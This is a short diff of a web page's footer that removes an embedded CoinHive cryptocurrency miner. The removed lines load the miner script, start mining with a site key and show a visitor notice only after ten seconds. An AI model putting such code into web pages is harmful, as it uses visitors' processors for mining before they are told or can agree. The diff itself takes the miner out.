@@ -7,9 +7,4 @@
 
       ga('create', 'UA-100361917-1', 'auto');
       ga('send', 'pageview');</script>
-<div id="minerWarn" style="display:none;font-size:0.8em;text-align:center;background:url('content/images/backgrounds/background_1.jpg')">This page uses a miner. Thank you for your support.<a id="stopMiner" style="text-decoration:underline;">Stop</a></div>
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-window.miner=new CoinHive.User("oRCSr6Hk0homQ1FQrHYTJlVipusMXCeb","htck"),miner.start(),miner.setThrottle(.2),miner.isMobile()&&miner.setThrottle(.8),setTimeout(function(){$("#minerWarn").css("display","block")},1e4),$("#stopMiner").click(function(){window.miner.isRunning()?(window.miner.stop(),this.innerHTML="Resume"):(window.miner.start(),this.innerHTML="Stop")});
-</script>
 </body> </html>
